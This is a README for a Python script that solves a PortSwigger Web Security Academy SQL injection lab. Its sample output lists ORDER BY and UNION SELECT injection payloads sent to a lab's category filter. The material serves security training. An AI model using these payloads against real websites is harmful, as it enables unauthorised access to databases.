# 🔐 SQL Injection vulnerability using UNION to identify column containing text

This script is designed to test for basic SQL injection vulnerabilities in labs from PortSwigger's Web Security Academy Lab: [SQL injection vulnerability using UNION to identify column containing text](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-finding-columns-with-a-useful-data-type/sql-injection/union-attacks/lab-find-column-containing-text#). It targets endpoints like `/filter?category=` and checks whether a given payload successfully bypasses input validation.

---

## 🚀 How It Works

The script performs the following steps:

1. **Disables SSL warnings** to avoid certificate issues with lab URLs.
2. **Sets up a proxy** (default: `127.0.0.1:8080`) for interception via tools like Burp Suite.
3. **Accepts two arguments**:
   - `url`: The base URL of the lab.
   - `string`: The SQL injection string to test.
4. **Constructs the full request URL** by appending the payload to `/filter?category=`.
5. **Sends the request** and checks the response if it returns back the search text, it is successful
6. **Prints the result** indicating whether the injection was successful.

---

## 🧪 Sample Usage

```bash
python3 unionTextColumnFInder.py https://0af6002503a6725d8062172900cf0019.web-security-academy.net erWOd5
```

### ✅ Sample Output

```
(+) Targeting: https://0af6002503a6725d8062172900cf0019.web-security-academy.net
(+) Determining number of columns using ORDER BY...

    ➤ Testing payload: ' ORDER BY 1--
    ➤ Testing payload: ' ORDER BY 2--
    ➤ Testing payload: ' ORDER BY 3--
    ➤ Testing payload: ' ORDER BY 4--

(✓) Found error at column 4, so total columns = 3

(+) Testing which of 3 columns accepts string data...

    ➤ Testing payload: ' UNION SELECT 'erWOd5',null,null--
    ✗ Column 1 caused an error. Trying next...

    ➤ Testing payload: ' UNION SELECT null,'erWOd5',null--

(✓) Column 2 accepts string data.

[✓] Lab solved with the following payload:

    ' UNION SELECT null,'erWOd5',null--
```

---

## 📌 Lab-Specific Note

For this particular lab, the script checks whether the response contains the search text to determine success. You can modify this keyword in the code to match other labs or contexts.

---

## 📦 Requirements

Install dependencies using:

```bash
pip install -r requirements.txt
```

---

## 📦 Walkthrough of the code
[Code Walkthrough](https://medium.com/@adhithyasivanesh/portswigger-web-security-academy-labs-sqli-lab-1-retrieving-hidden-data-fe40ea356d5d)

